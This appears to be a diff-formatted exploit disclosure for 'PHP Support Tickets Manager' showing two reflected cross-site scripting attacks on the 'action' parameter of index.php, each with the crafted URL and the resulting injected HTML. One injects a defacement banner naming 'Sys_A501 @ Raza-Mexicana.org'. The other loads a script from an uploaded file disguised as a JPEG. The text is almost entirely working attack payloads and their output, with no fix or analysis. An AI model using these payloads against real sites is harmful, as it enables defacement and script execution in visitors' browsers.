@@ -1,0 +1,30 @@
+Example 1 (XSS):
+ url:
+http://www.example.com/app_folder/index.php?action=Register<marquee><h1>Sys_A501%
+20@%20Raza-Mexicana.org</h1></marquee>
+ Code:
+<!-- PHP Support Tickets Manager - Triangle Solutions Ltd /-->
+<!-- END OF HEADER FILE -->
+
+    <table width="75%" cellspacing="1" cellpadding="1"
+class="boxborder" align="center">
+      <tr>
+      <td class="boxborder text"
+bgcolor="#AABBDD">Register<marquee><h1>Sys_A501 @
+Raza-Mexicana.org</h1></marquee></td>
+
+
+Example 2 (JS as JPEG):
+ url:
+http://www.example.com/app_folder/index.php?action=Login%3Cscript%20src=./upload/
+1671.jpg%3E%3C/script%3E
+ Code:
+<!-- PHP Support Tickets Manager - Triangle Solutions Ltd /-->
+<!-- END OF HEADER FILE -->
+
+    <table width="75%" cellspacing="1" cellpadding="1"
+class="boxborder" align="center">
+      <tr>
+      <td class="boxborder text"
+bgcolor="#AABBDD">Login<script src=./upload/1671.jpg></script></td>
+
